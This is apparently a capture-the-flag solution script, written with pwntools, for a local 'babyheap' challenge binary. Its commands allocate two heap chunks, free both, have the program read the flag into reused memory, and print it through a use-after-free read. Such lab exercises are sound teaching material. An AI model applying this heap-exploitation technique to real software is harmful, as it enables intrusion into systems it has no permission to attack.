# Nagib Lakhdari 3si2
from pwn import *

# Start the process for the challenge binary
p = process("/challenge/babyheap_level3.0")

# Send commands to the process
p.sendline(b'malloc')      # Allocate memory
p.sendline(b'0')           # Index for the memory allocation
p.sendline(b'600')         # Size of the memory allocation
p.sendline(b'malloc')      # Allocate another memory block
p.sendline(b'1')           # Index for the second memory allocation
p.sendline(b'600')         # Size of the second memory allocation
p.sendline(b'free')        # Free the first allocated memory block
p.sendline(b'0')           # Index of the first memory block
p.sendline(b'free')        # Free the second allocated memory block
p.sendline(b'1')           # Index of the second memory block
p.sendline(b'read_flag')   # Read the flag
p.sendline(b'puts')        # Print the flag
p.sendline(b'0')           # Index to print

# Interact with the process to get the output
p.interactive()
